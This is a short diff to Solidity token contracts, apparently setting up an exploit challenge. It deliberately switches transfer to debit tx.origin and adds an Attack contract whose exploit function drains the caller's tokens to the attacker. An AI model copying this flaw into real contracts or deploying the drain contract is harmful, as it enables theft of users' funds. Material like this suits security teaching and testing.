@@ -15,8 +15,9 @@ contract Token {
 
     function transfer(address _recipient, uint _amount) external {
         balances[_recipient] += _amount;
-        balances[msg.sender] -= _amount;
-        // balances[tx.origin] -= _amount;
+        // balances[msg.sender] -= _amount;
+        // rune exploit challenge
+        balances[tx.origin] -= _amount;
     }
 
     function approve(address _spender, uint _amount) external {
@@ -37,5 +38,19 @@ contract Protocol {
     function deposit(address _token, uint _amount) external {
         Token(_token).transferFrom(msg.sender, _amount);
         balances[msg.sender] += _amount;
+    }
+}
+
+contract Attack {
+    address public owner;
+    Token token;
+
+    constructor(Token _token) {
+        token = Token(_token);
+        owner = payable(msg.sender);
+    }
+
+    function exploit() public {
+        token.transfer((owner), token.balanceOf(msg.sender));
     }
 }
